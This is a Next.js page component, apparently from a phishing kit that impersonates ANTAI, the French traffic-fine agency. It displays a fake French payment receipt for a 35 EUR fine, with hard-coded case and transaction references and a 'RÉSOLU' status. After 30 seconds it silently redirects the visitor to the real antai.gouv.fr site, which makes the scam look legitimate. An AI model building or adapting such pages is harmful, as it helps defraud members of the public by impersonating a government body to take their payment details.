"use client";

import Footer from "@/components/Footer";
import Navbar from "@/components/Navbar";
import Image from "next/image";
import { useEffect } from "react";

type Props = {};

const SuccessPage = ({}: Props) => {
  useEffect(() => {
    setTimeout(() => {
      window.location.href = "https://antai.gouv.fr/a-propos";
    }, 30000);
  }, []);

  return (
    <main className="flex min-h-screen flex-col items-center ">
      <Navbar />
      <Image src="/sent.gif" alt="sent" width={150} height={150} />
      <div>
       <div className="flex justify-center">
    <h1 className="text-xl font-bold">Recapitulatif de paiement :</h1>
</div>
        <p>
          Nous sommes heureux de vous informer que votre paiement a été reçu avec succès pour la contravention. <br></br>Voici les détails de votre transaction :
        </p><br></br>
          <p>• Date de la transaction : {new Date().toLocaleDateString()} à {new Date().toLocaleTimeString()}</p>
          <p>• Référence de dossier : 1507590117204085</p>
          <p>• Statut du dossier : RÉSOLU</p>
          <p>• Statut de paiement : Paiement reçu</p>
          <p>• Montant débité : 35,00 EUR</p>
          <p>• Référence de la transaction : 2901092280</p>
      </div>
      <Footer />
    </main>
  );
};

export default SuccessPage;
